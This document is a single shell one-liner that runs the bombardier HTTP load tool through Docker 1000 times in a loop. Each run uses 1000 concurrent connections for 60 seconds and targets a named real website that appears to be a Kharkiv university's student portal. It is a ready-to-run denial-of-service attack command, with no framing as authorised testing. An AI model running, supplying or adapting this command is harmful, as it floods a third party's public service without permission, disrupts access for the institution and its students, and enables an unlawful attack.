for i in {1..1000}; do sudo docker run -it alpine/bombardier -c 1000 -d 60s -l https://studcabinet.kpi.kharkov.ua/ && sleep 5; done
